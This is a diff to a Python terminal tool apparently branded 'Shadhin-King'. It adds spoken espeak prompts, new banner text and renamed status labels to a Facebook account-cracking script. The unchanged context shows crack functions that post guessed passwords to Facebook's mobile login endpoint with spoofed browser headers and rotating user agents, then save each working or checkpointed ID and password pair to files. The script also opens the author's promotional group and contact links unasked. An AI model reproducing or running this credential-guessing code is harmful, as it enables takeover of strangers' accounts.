@@ -17,9 +17,16 @@ pretty.install()
 CON=sol()
  #------------------[ Shadhin-King ]-------------------#
 import os, platform, time, sys
-print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...? ')
-time.sleep(5)
 os.system('clear')
+os.system('espeak -a 300 " Checking,  Update,"')
+print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...? ')
+time.sleep(2)
+os.system('clear')
+os.system('espeak -a 300 " Update, Version, 0.1,"')
+print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mUpdate Version 0.1 ')
+time.sleep(2)
+os.system('clear')
+os.system('espeak -a 300 " Join,   My,  Facebook,  Group,"')
 print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY SCRIPT GIFT GROUP")
 time.sleep(2)
 os.system(f'xdg-open https://facebook.com/groups/439070528619325/')
@@ -196,17 +203,17 @@ os.system("xdg-open https://www.facebook.com/Shadhin.King.Ok.Bro")
 #------------------[ LOGO-LAKNAT ]-----------------#
 logo =""" 
 \033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\033[0;92m███████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗██╗███╗   ██╗                       
-║\033[0;92m██╔════╝██║  ██║██╔══██╗██╔══██╗██║  ██║██║████╗  ██║                
-║\033[0;92m███████╗███████║███████║██║  ██║███████║██║██╔██╗ ██║           
-║\033[0;92m╚════██║██╔══██║██╔══██║██║  ██║██╔══██║██║██║╚██╗██║         
-║\033[0;92m███████║██║  ██║██║  ██║██████╔╝██║  ██║██║██║ ╚████║                  
-║\033[0;92m╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝                     
+║\033[0;92m███████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗██╗███╗   ██╗
+║\033[0;92m██╔════╝██║  ██║██╔══██╗██╔══██╗██║  ██║██║████╗  ██║
+║\033[0;92m███████╗███████║███████║██║  ██║███████║██║██╔██╗ ██║
+║\033[0;92m╚════██║██╔══██║██╔══██║██║  ██║██╔══██║██║██║╚██╗██║   
+║\033[0;92m███████║██║  ██║██║  ██║██████╔╝██║  ██║██║██║ ╚████║
+║\033[0;92m╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
 \033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
-╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\33[0;41m        [ WORKING ONLY MOBILE DATA ]         \033[0;92m║
-╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
-\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
+╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+║\33[0;41m        [ ASSALAMUYALAIKUM ]         \033[0;92m║
+╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+\033[0;32m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
 ╠══[Author                   • \033[0;92mSHADHIN AHMED ]  
 ╠══[Facebook                 • \033[0;92mMD SHADHIN ISLAM ]        
 ╠══[Github                   • \033[0;92mShadhin-King ]         
@@ -214,9 +221,10 @@ logo ="""
 ╠══[TOOLS                    • \033[0;92mFREE ]            
 ╠══[VERSION                  • \033[0;92m0.1 ]               
 \033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝"""
+
 os.system('clear')
 print(logo)
-os.system('espeak -a 300 " Your,   Real,  Name,""')
+os.system('espeak -a 300 " Your,   Real,  Name,  Sir,"')
 uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
 os.system('espeak -a 300 " Welcome,   to,  Shadhin,  King,  Tools"')
 pass
@@ -280,18 +288,18 @@ def menu():
     print(f"""\033[97;1m[\033[92;1m3\033[97;1m] \033[92;1mCHECK OK IDz   """)
     print("""\033[97;1m[\033[92;1m0\033[97;1m] \033[0;91mEXIT""")
     print('\033[0;97m=================')
-    TUTUL = input('\x1b[1;92m[+] CHOOSE: ')
-    if TUTUL in ['111']:
+    SHADHIN = input('\x1b[1;92m[+] CHOOSE: ')
+    if SHADHIN in ['111']:
         login()
         dump_massal()
-    elif TUTUL in ['1']:
+    elif SHADHIN in ['1']:
         crack_file()
-    elif TUTUL in ['2','02']:
+    elif SHADHIN in ['2','02']:
         os.system('xdg-open https://wa.me/+8801773452898')
         os.system("python nono.py")
-    elif TUTUL in ['3','03']:
+    elif SHADHIN in ['3','03']:
         result()
-    elif TUTUL in ['0']:
+    elif SHADHIN in ['0']:
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
         print('\033[0;97m=================')
@@ -620,7 +628,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[100;92m{bo}[Shadhin•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
+    sys.stdout.write(f"\r\033[100;92m{bo}[𝐕𝐀𝐈𝐋𝐄𝐍𝐂𝐄•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -637,8 +645,8 @@ def crack(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;94m[Shadhin-Cp] {idf} • {pw}')
-                os.system('espeak -a 300 " Cp,"')
+                print(f'\r\033[0;94m[Shadhin-Cp💔] {idf} • {pw}')
+                os.system('espeak -a 300 " Shadhin, Cp,  id,"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
@@ -662,7 +670,7 @@ def crack(idf,pwv):
  
 def crackfree(idf,pwv):
     global loop,ok,cp
-    sys.stdout.write(f"\r{H}[Shadhin-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r{H}[𝐕𝐀𝐈𝐋𝐄𝐍𝐂𝐄-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -679,8 +687,8 @@ def crackfree(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Shadhin-Cp] {idf} • {pw}')
-                os.system('espeak -a 300 " Cp,"')
+                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Shadhin-Co💔] {idf} • {pw}')
+                os.system('espeak -a 300 " Shadhin, Cp,  id,"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
@@ -689,8 +697,8 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Shadhin-Ok] {idf} • {pw} ')
-                os.system('espeak -a 300 " Ok,  Shadhin,  id"')
+                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Shadhin-Ok💚] {idf} • {pw} ')
+                os.system('espeak -a 300 "   Shadhin, Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
